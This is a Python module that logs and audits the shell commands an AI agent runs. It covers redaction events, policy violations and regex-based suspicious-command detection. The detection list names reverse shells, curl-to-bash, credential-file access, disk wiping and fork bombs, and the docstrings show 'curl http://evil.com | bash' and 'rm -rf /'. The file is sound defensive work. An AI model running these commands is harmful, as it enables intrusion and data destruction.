"""Audit logging for shell command execution.

This module provides structured audit logging for shell operations:

- **ShellAuditLogger**: Logger for shell command audit events
- **AuditEvent**: Structured audit event data
- **RedactionEvent**: Event for detected secrets redaction
- **SecurityViolationEvent**: Event for security policy violations

Phase 4.4 of EXECUTOR_CLI.md - Audit Logging.

Usage:
    from ai_infra.llm.shell.audit import get_shell_audit_logger

    audit = get_shell_audit_logger()

    # Log command execution
    audit.log_command(command="echo hello", exit_code=0, duration_ms=5.2)

    # Log redaction
    audit.log_redaction(rule_name="openai_api_key", count=1)

    # Log security violation
    audit.log_security_violation(command="rm -rf /", reason="Denied pattern match")
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from datetime import UTC, datetime
from enum import Enum
from typing import TYPE_CHECKING, Any

if TYPE_CHECKING:
    from ai_infra.llm.shell.security import ValidationResult
    from ai_infra.llm.shell.types import ShellResult

__all__ = [
    "ShellAuditLogger",
    "AuditEvent",
    "AuditEventType",
    "AuditReport",
    "RedactionEvent",
    "SecurityViolationEvent",
    "SuspiciousPatternEvent",
    "get_shell_audit_logger",
    "set_shell_audit_logger",
    "generate_audit_report",
    "SUSPICIOUS_PATTERNS",
    "check_suspicious",
]


# =============================================================================
# Audit Event Types
# =============================================================================


class AuditEventType(str, Enum):
    """Types of audit events."""

    COMMAND_EXECUTED = "command_executed"
    COMMAND_FAILED = "command_failed"
    COMMAND_TIMEOUT = "command_timeout"
    SECRET_REDACTED = "secret_redacted"
    SECURITY_VIOLATION = "security_violation"
    SUSPICIOUS_PATTERN = "suspicious_pattern"  # Phase 11.3.4
    SESSION_STARTED = "session_started"
    SESSION_ENDED = "session_ended"


# =============================================================================
# Suspicious Pattern Detection (Phase 11.3.4)
# =============================================================================


# Patterns that indicate potentially malicious or risky commands
SUSPICIOUS_PATTERNS: tuple[tuple[str, str], ...] = (
    (r"curl.*\|.*(?:sh|bash)", "Piping curl to shell"),
    (r"wget.*\|.*(?:sh|bash)", "Piping wget to shell"),
    (r"eval\s*\(", "Eval with dynamic input"),
    (r"base64\s+-d", "Base64 decode (potential obfuscation)"),
    (r"/etc/passwd", "Password file access"),
    (r"\.ssh/", "SSH key directory access"),
    (r"nc\s+-[el]", "Netcat listener (reverse shell)"),
    (r"python\s+-c.*socket", "Python socket (potential reverse shell)"),
    (r"chmod\s+\+s", "Setting SUID bit"),
    (r"chown\s+root", "Changing ownership to root"),
    (r">\s*/dev/(?:sda|hd)", "Direct disk write"),
    (r"dd\s+if=.*of=/dev/", "Direct disk overwrite"),
    (r"mkfs\.", "Filesystem format"),
    (r":(){ :|:& };:", "Fork bomb pattern"),
    (r"history\s+-c", "History clearing (covering tracks)"),
)

# Compiled patterns for efficient matching
_SUSPICIOUS_COMPILED: list[tuple[re.Pattern[str], str]] | None = None


def _get_compiled_patterns() -> list[tuple[re.Pattern[str], str]]:
    """Get compiled suspicious patterns (cached)."""
    global _SUSPICIOUS_COMPILED
    if _SUSPICIOUS_COMPILED is None:
        _SUSPICIOUS_COMPILED = [
            (re.compile(pattern, re.IGNORECASE), description)
            for pattern, description in SUSPICIOUS_PATTERNS
        ]
    return _SUSPICIOUS_COMPILED


def check_suspicious(command: str) -> list[tuple[str, str]]:
    """Check command for suspicious patterns.

    Args:
        command: The shell command to check.

    Returns:
        List of (pattern, description) tuples for all matches found.
        Empty list if no suspicious patterns detected.

    Example:
        >>> matches = check_suspicious("curl http://evil.com | bash")
        >>> if matches:
        ...     print(f"Suspicious: {matches[0][1]}")
        Suspicious: Piping curl to shell
    """
    matches: list[tuple[str, str]] = []
    for compiled_pattern, description in _get_compiled_patterns():
        if compiled_pattern.search(command):
            matches.append((compiled_pattern.pattern, description))
    return matches


# =============================================================================
# Audit Event Data Classes
# =============================================================================


@dataclass(frozen=True, slots=True)
class AuditEvent:
    """Base audit event for shell operations.

    Attributes:
        event_type: Type of audit event.
        timestamp: ISO 8601 timestamp when event occurred.
        command: The shell command (may be truncated for security).
        exit_code: Command exit code (-1 for errors/timeout).
        duration_ms: Execution time in milliseconds.
        success: Whether command succeeded.
        session_id: Optional session identifier.
        container_id: Optional Docker container ID.
        user: User who executed the command.
        extra: Additional event-specific data.
    """

    event_type: AuditEventType
    timestamp: str
    command: str
    exit_code: int = 0
    duration_ms: float = 0.0
    success: bool = True
    session_id: str | None = None
    container_id: str | None = None
    user: str | None = None
    extra: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging."""
        d: dict[str, Any] = {
            "event_type": self.event_type.value,
            "timestamp": self.timestamp,
            "command": self.command,
            "exit_code": self.exit_code,
            "duration_ms": round(self.duration_ms, 2),
            "success": self.success,
        }
        if self.session_id:
            d["session_id"] = self.session_id
        if self.container_id:
            d["container_id"] = self.container_id
        if self.user:
            d["user"] = self.user
        if self.extra:
            d.update(self.extra)
        return d

    @classmethod
    def from_result(
        cls,
        result: ShellResult,
        *,
        session_id: str | None = None,
        container_id: str | None = None,
        user: str | None = None,
    ) -> AuditEvent:
        """Create audit event from ShellResult.

        Args:
            result: Shell execution result.
            session_id: Optional session identifier.
            container_id: Optional Docker container ID.
            user: User who executed the command.

        Returns:
            AuditEvent with appropriate type based on result.
        """
        if result.timed_out:
            event_type = AuditEventType.COMMAND_TIMEOUT
        elif result.success:
            event_type = AuditEventType.COMMAND_EXECUTED
        else:
            event_type = AuditEventType.COMMAND_FAILED

        return cls(
            event_type=event_type,
            timestamp=datetime.now(UTC).isoformat(),
            command=_truncate_command(result.command),
            exit_code=result.exit_code,
            duration_ms=result.duration_ms,
            success=result.success,
            session_id=session_id,
            container_id=container_id,
            user=user,
        )


@dataclass(frozen=True, slots=True)
class RedactionEvent:
    """Audit event for secret redaction.

    Attributes:
        timestamp: ISO 8601 timestamp.
        rule_name: Name of the redaction rule that matched.
        count: Number of matches redacted.
        command: The command where secrets were found (truncated).
        session_id: Optional session identifier.
    """

    timestamp: str
    rule_name: str
    count: int
    command: str
    session_id: str | None = None

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging."""
        d: dict[str, Any] = {
            "event_type": AuditEventType.SECRET_REDACTED.value,
            "timestamp": self.timestamp,
            "rule_name": self.rule_name,
            "count": self.count,
            "command": self.command,
        }
        if self.session_id:
            d["session_id"] = self.session_id
        return d


@dataclass(frozen=True, slots=True)
class SecurityViolationEvent:
    """Audit event for security policy violations.

    Attributes:
        timestamp: ISO 8601 timestamp.
        command: The command that violated policy (truncated).
        reason: Description of why command was denied.
        policy_name: Name of the policy that was violated.
        matched_pattern: The pattern that matched (if applicable).
        session_id: Optional session identifier.
        user: User who attempted the command.
    """

    timestamp: str
    command: str
    reason: str
    policy_name: str = "default"
    matched_pattern: str | None = None
    session_id: str | None = None
    user: str | None = None

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging."""
        d: dict[str, Any] = {
            "event_type": AuditEventType.SECURITY_VIOLATION.value,
            "timestamp": self.timestamp,
            "command": self.command,
            "reason": self.reason,
            "policy_name": self.policy_name,
        }
        if self.matched_pattern:
            d["matched_pattern"] = self.matched_pattern
        if self.session_id:
            d["session_id"] = self.session_id
        if self.user:
            d["user"] = self.user
        return d

    @classmethod
    def from_validation_result(
        cls,
        command: str,
        result: ValidationResult,
        *,
        policy_name: str = "default",
        session_id: str | None = None,
        user: str | None = None,
    ) -> SecurityViolationEvent:
        """Create from a ValidationResult.

        Args:
            command: The command that was validated.
            result: ValidationResult from security check.
            policy_name: Name of the security policy.
            session_id: Optional session identifier.
            user: User who attempted the command.

        Returns:
            SecurityViolationEvent with details from validation result.
        """
        return cls(
            timestamp=datetime.now(UTC).isoformat(),
            command=_truncate_command(command),
            reason=result.reason or "Security policy violation",
            policy_name=policy_name,
            matched_pattern=result.matched_pattern,
            session_id=session_id,
            user=user,
        )


@dataclass(frozen=True, slots=True)
class SuspiciousPatternEvent:
    """Audit event for suspicious pattern detection (Phase 11.3.4).

    Suspicious patterns are commands that match known attack signatures
    but may not be explicitly blocked. They are logged for review.

    Attributes:
        timestamp: ISO 8601 timestamp.
        command: The command that matched suspicious patterns (truncated).
        matched_patterns: List of (pattern, description) tuples that matched.
        session_id: Optional session identifier.
        user: User who executed the command.
    """

    timestamp: str
    command: str
    matched_patterns: tuple[tuple[str, str], ...]
    session_id: str | None = None
    user: str | None = None

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging."""
        d: dict[str, Any] = {
            "event_type": AuditEventType.SUSPICIOUS_PATTERN.value,
            "timestamp": self.timestamp,
            "command": self.command,
            "matched_patterns": [
                {"pattern": p, "description": d} for p, d in self.matched_patterns
            ],
            "pattern_count": len(self.matched_patterns),
        }
        if self.session_id:
            d["session_id"] = self.session_id
        if self.user:
            d["user"] = self.user
        return d


# =============================================================================
# Helper Functions
# =============================================================================


def _truncate_command(command: str, max_length: int = 200) -> str:
    """Truncate command for safe logging.

    Args:
        command: The command to truncate.
        max_length: Maximum length to keep.

    Returns:
        Truncated command with ellipsis if needed.
    """
    if len(command) <= max_length:
        return command
    return command[:max_length] + "..."


def _get_current_user() -> str | None:
    """Get current user for audit logging."""
    import os

    return os.environ.get("USER") or os.environ.get("USERNAME")


# =============================================================================
# Shell Audit Logger
# =============================================================================


class ShellAuditLogger:
    """Structured audit logger for shell operations.

    Provides methods for logging shell-related audit events with
    consistent structure and fields.

    Example:
        audit = ShellAuditLogger()

        # Log command execution
        audit.log_command(command="echo hello", exit_code=0, duration_ms=5.2)

        # Log from ShellResult
        audit.log_result(result)

        # Log security violation
        audit.log_security_violation(
            command="rm -rf /",
            reason="Matches denied pattern",
            matched_pattern="rm\\s+-rf",
        )
    """

    def __init__(
        self,
        name: str = "shell.audit",
        *,
        enabled: bool = True,
        include_user: bool = True,
    ) -> None:
        """Initialize audit logger.

        Args:
            name: Logger name (prefixed with ai_infra.).
            enabled: Whether audit logging is enabled.
            include_user: Whether to include current user in logs.
        """
        self._logger = logging.getLogger(f"ai_infra.{name}")
        self._enabled = enabled
        self._include_user = include_user

    @property
    def enabled(self) -> bool:
        """Whether audit logging is enabled."""
        return self._enabled

    @enabled.setter
    def enabled(self, value: bool) -> None:
        """Enable or disable audit logging."""
        self._enabled = value

    def _log(self, level: int, message: str, **fields: Any) -> None:
        """Internal logging method."""
        if self._enabled and self._logger.isEnabledFor(level):
            self._logger.log(level, message, extra=fields)

    def _get_user(self) -> str | None:
        """Get user for audit log if enabled."""
        return _get_current_user() if self._include_user else None

    # -------------------------------------------------------------------------
    # Command Execution Logging
    # -------------------------------------------------------------------------

    def log_command(
        self,
        command: str,
        exit_code: int,
        duration_ms: float,
        *,
        success: bool | None = None,
        timed_out: bool = False,
        session_id: str | None = None,
        container_id: str | None = None,
    ) -> None:
        """Log a shell command execution.

        Args:
            command: The command that was executed.
            exit_code: Command exit code.
            duration_ms: Execution time in milliseconds.
            success: Whether command succeeded (defaults to exit_code == 0).
            timed_out: Whether command timed out.
            session_id: Optional session identifier.
            container_id: Optional Docker container ID.
        """
        if success is None:
            success = exit_code == 0

        # Determine event type
        if timed_out:
            event_type = AuditEventType.COMMAND_TIMEOUT
            level = logging.WARNING
        elif success:
            event_type = AuditEventType.COMMAND_EXECUTED
            level = logging.INFO
        else:
            event_type = AuditEventType.COMMAND_FAILED
            level = logging.WARNING

        event = AuditEvent(
            event_type=event_type,
            timestamp=datetime.now(UTC).isoformat(),
            command=_truncate_command(command),
            exit_code=exit_code,
            duration_ms=duration_ms,
            success=success,
            session_id=session_id,
            container_id=container_id,
            user=self._get_user(),
        )

        self._log(level, "shell_command", **event.to_dict())

    def log_result(
        self,
        result: ShellResult,
        *,
        session_id: str | None = None,
        container_id: str | None = None,
    ) -> None:
        """Log from a ShellResult object.

        Args:
            result: Shell execution result.
            session_id: Optional session identifier.
            container_id: Optional Docker container ID.
        """
        self.log_command(
            command=result.command,
            exit_code=result.exit_code,
            duration_ms=result.duration_ms,
            success=result.success,
            timed_out=result.timed_out,
            session_id=session_id,
            container_id=container_id,
        )

    # -------------------------------------------------------------------------
    # Redaction Logging
    # -------------------------------------------------------------------------

    def log_redaction(
        self,
        rule_name: str,
        count: int = 1,
        *,
        command: str | None = None,
        session_id: str | None = None,
    ) -> None:
        """Log that secrets were redacted from output.

        Args:
            rule_name: Name of the redaction rule that matched.
            count: Number of matches redacted.
            command: The command where secrets were found.
            session_id: Optional session identifier.
        """
        event = RedactionEvent(
            timestamp=datetime.now(UTC).isoformat(),
            rule_name=rule_name,
            count=count,
            command=_truncate_command(command or ""),
            session_id=session_id,
        )

        self._log(logging.WARNING, "secret_redacted", **event.to_dict())

    def log_redactions(
        self,
        redactions: dict[str, int],
        *,
        command: str | None = None,
        session_id: str | None = None,
    ) -> None:
        """Log multiple redaction events.

        Args:
            redactions: Mapping of rule_name -> count.
            command: The command where secrets were found.
            session_id: Optional session identifier.
        """
        for rule_name, count in redactions.items():
            if count > 0:
                self.log_redaction(
                    rule_name=rule_name,
                    count=count,
                    command=command,
                    session_id=session_id,
                )

    # -------------------------------------------------------------------------
    # Security Violation Logging
    # -------------------------------------------------------------------------

    def log_security_violation(
        self,
        command: str,
        reason: str,
        *,
        policy_name: str = "default",
        matched_pattern: str | None = None,
        session_id: str | None = None,
    ) -> None:
        """Log a security policy violation.

        Args:
            command: The command that violated policy.
            reason: Description of why command was denied.
            policy_name: Name of the security policy.
            matched_pattern: The pattern that matched (if applicable).
            session_id: Optional session identifier.
        """
        event = SecurityViolationEvent(
            timestamp=datetime.now(UTC).isoformat(),
            command=_truncate_command(command),
            reason=reason,
            policy_name=policy_name,
            matched_pattern=matched_pattern,
            session_id=session_id,
            user=self._get_user(),
        )

        self._log(logging.WARNING, "security_violation", **event.to_dict())

    def log_validation_result(
        self,
        command: str,
        result: ValidationResult,
        *,
        policy_name: str = "default",
        session_id: str | None = None,
    ) -> None:
        """Log a security validation result if it's a violation.

        Args:
            command: The command that was validated.
            result: ValidationResult from security check.
            policy_name: Name of the security policy.
            session_id: Optional session identifier.
        """
        # Only log violations (denied commands)
        from ai_infra.llm.shell.security import ValidationStatus

        if result.status != ValidationStatus.ALLOWED:
            self.log_security_violation(
                command=command,
                reason=result.reason or "Security policy violation",
                policy_name=policy_name,
                matched_pattern=result.matched_pattern,
                session_id=session_id,
            )

    # -------------------------------------------------------------------------
    # Suspicious Pattern Logging (Phase 11.3.4)
    # -------------------------------------------------------------------------

    def log_suspicious_patterns(
        self,
        command: str,
        matched_patterns: list[tuple[str, str]],
        *,
        session_id: str | None = None,
    ) -> None:
        """Log suspicious patterns detected in a command.

        Args:
            command: The command that matched suspicious patterns.
            matched_patterns: List of (pattern, description) tuples.
            session_id: Optional session identifier.
        """
        if not matched_patterns:
            return

        event = SuspiciousPatternEvent(
            timestamp=datetime.now(UTC).isoformat(),
            command=_truncate_command(command),
            matched_patterns=tuple(matched_patterns),
            session_id=session_id,
            user=self._get_user(),
        )

        self._log(logging.WARNING, "suspicious_pattern", **event.to_dict())

    def check_and_log_suspicious(
        self,
        command: str,
        *,
        session_id: str | None = None,
    ) -> list[tuple[str, str]]:
        """Check command for suspicious patterns and log if found.

        Combines check_suspicious() with logging for convenience.

        Args:
            command: The command to check.
            session_id: Optional session identifier.

        Returns:
            List of (pattern, description) tuples for all matches found.
        """
        matches = check_suspicious(command)
        if matches:
            self.log_suspicious_patterns(command, matches, session_id=session_id)
        return matches

    # -------------------------------------------------------------------------
    # Session Logging
    # -------------------------------------------------------------------------

    def log_session_started(
        self,
        session_id: str,
        *,
        container_id: str | None = None,
        config: dict[str, Any] | None = None,
    ) -> None:
        """Log session start event.

        Args:
            session_id: Session identifier.
            container_id: Docker container ID if applicable.
            config: Session configuration details.
        """
        extra: dict[str, Any] = {
            "event_type": AuditEventType.SESSION_STARTED.value,
            "timestamp": datetime.now(UTC).isoformat(),
            "session_id": session_id,
        }
        if container_id:
            extra["container_id"] = container_id
        if config:
            extra["config"] = config
        if user := self._get_user():
            extra["user"] = user

        self._log(logging.INFO, "session_started", **extra)

    def log_session_ended(
        self,
        session_id: str,
        *,
        container_id: str | None = None,
        duration_seconds: float | None = None,
        command_count: int | None = None,
    ) -> None:
        """Log session end event.

        Args:
            session_id: Session identifier.
            container_id: Docker container ID if applicable.
            duration_seconds: Total session duration.
            command_count: Number of commands executed in session.
        """
        extra: dict[str, Any] = {
            "event_type": AuditEventType.SESSION_ENDED.value,
            "timestamp": datetime.now(UTC).isoformat(),
            "session_id": session_id,
        }
        if container_id:
            extra["container_id"] = container_id
        if duration_seconds is not None:
            extra["duration_seconds"] = round(duration_seconds, 2)
        if command_count is not None:
            extra["command_count"] = command_count
        if user := self._get_user():
            extra["user"] = user

        self._log(logging.INFO, "session_ended", **extra)


# =============================================================================
# Global Audit Logger
# =============================================================================


_audit_logger: ShellAuditLogger | None = None


def get_shell_audit_logger() -> ShellAuditLogger:
    """Get the global shell audit logger.

    Returns:
        The global ShellAuditLogger instance.
    """
    global _audit_logger
    if _audit_logger is None:
        _audit_logger = ShellAuditLogger()
    return _audit_logger


def set_shell_audit_logger(logger: ShellAuditLogger) -> None:
    """Set the global shell audit logger.

    Args:
        logger: The ShellAuditLogger to use globally.
    """
    global _audit_logger
    _audit_logger = logger


# =============================================================================
# Audit Report
# =============================================================================


@dataclass(frozen=True, slots=True)
class AuditReport:
    """Summary report for an agent run's shell activity.

    Provides aggregate statistics for all shell commands executed
    during a run, including success/failure counts, security violations,
    and timing information.

    Attributes:
        run_id: Unique identifier for the agent run.
        total_commands: Total number of shell commands executed.
        successful_commands: Number of commands that succeeded.
        failed_commands: Number of commands that failed.
        timed_out_commands: Number of commands that timed out.
        blocked_commands: Number of commands blocked by security policy.
        secrets_redacted: Total number of secrets redacted from output.
        total_duration_ms: Total execution time in milliseconds.
        session_count: Number of shell sessions used.
        start_time: ISO 8601 timestamp when run started.
        end_time: ISO 8601 timestamp when run ended.

    Example:
        >>> report = AuditReport(
        ...     run_id="run-123",
        ...     total_commands=50,
        ...     successful_commands=48,
        ...     failed_commands=2,
        ...     total_duration_ms=15000.0,
        ... )
        >>> print(f"Success rate: {report.success_rate:.1%}")
        Success rate: 96.0%
    """

    run_id: str
    total_commands: int = 0
    successful_commands: int = 0
    failed_commands: int = 0
    timed_out_commands: int = 0
    blocked_commands: int = 0
    secrets_redacted: int = 0
    total_duration_ms: float = 0.0
    session_count: int = 0
    start_time: str | None = None
    end_time: str | None = None

    @property
    def success_rate(self) -> float:
        """Calculate success rate as a fraction (0.0 to 1.0).

        Returns:
            Success rate, or 1.0 if no commands were executed.
        """
        if self.total_commands == 0:
            return 1.0
        return self.successful_commands / self.total_commands

    @property
    def failure_rate(self) -> float:
        """Calculate failure rate as a fraction (0.0 to 1.0).

        Returns:
            Failure rate, or 0.0 if no commands were executed.
        """
        if self.total_commands == 0:
            return 0.0
        return self.failed_commands / self.total_commands

    @property
    def average_duration_ms(self) -> float:
        """Calculate average command duration in milliseconds.

        Returns:
            Average duration, or 0.0 if no commands were executed.
        """
        if self.total_commands == 0:
            return 0.0
        return self.total_duration_ms / self.total_commands

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for logging or serialization.

        Returns:
            Dictionary with all report fields and computed properties.
        """
        d: dict[str, Any] = {
            "run_id": self.run_id,
            "total_commands": self.total_commands,
            "successful_commands": self.successful_commands,
            "failed_commands": self.failed_commands,
            "timed_out_commands": self.timed_out_commands,
            "blocked_commands": self.blocked_commands,
            "secrets_redacted": self.secrets_redacted,
            "total_duration_ms": round(self.total_duration_ms, 2),
            "session_count": self.session_count,
            "success_rate": round(self.success_rate, 4),
            "average_duration_ms": round(self.average_duration_ms, 2),
        }
        if self.start_time:
            d["start_time"] = self.start_time
        if self.end_time:
            d["end_time"] = self.end_time
        return d


def generate_audit_report(
    run_id: str,
    results: list[ShellResult],
    *,
    blocked_commands: int = 0,
    secrets_redacted: int = 0,
    session_count: int = 1,
    start_time: str | None = None,
    end_time: str | None = None,
) -> AuditReport:
    """Generate an audit report from shell execution results.

    Aggregates statistics from a list of ShellResult objects to produce
    a summary report for an agent run.

    Args:
        run_id: Unique identifier for the agent run.
        results: List of ShellResult objects from command execution.
        blocked_commands: Number of commands blocked by security policy.
        secrets_redacted: Total number of secrets redacted from output.
        session_count: Number of shell sessions used.
        start_time: ISO 8601 timestamp when run started.
        end_time: ISO 8601 timestamp when run ended.

    Returns:
        AuditReport with aggregated statistics.

    Example:
        >>> results = [
        ...     ShellResult(success=True, exit_code=0, ...),
        ...     ShellResult(success=False, exit_code=1, ...),
        ... ]
        >>> report = generate_audit_report("run-123", results)
        >>> print(f"Total: {report.total_commands}, Failed: {report.failed_commands}")
        Total: 2, Failed: 1
    """
    total = len(results)
    successful = sum(1 for r in results if r.success)
    failed = sum(1 for r in results if not r.success and not r.timed_out)
    timed_out = sum(1 for r in results if r.timed_out)
    total_duration = sum(r.duration_ms for r in results)

    # Use current time if not provided
    if end_time is None:
        end_time = datetime.now(UTC).isoformat()

    return AuditReport(
        run_id=run_id,
        total_commands=total,
        successful_commands=successful,
        failed_commands=failed,
        timed_out_commands=timed_out,
        blocked_commands=blocked_commands,
        secrets_redacted=secrets_redacted,
        total_duration_ms=total_duration,
        session_count=session_count,
        start_time=start_time,
        end_time=end_time,
    )
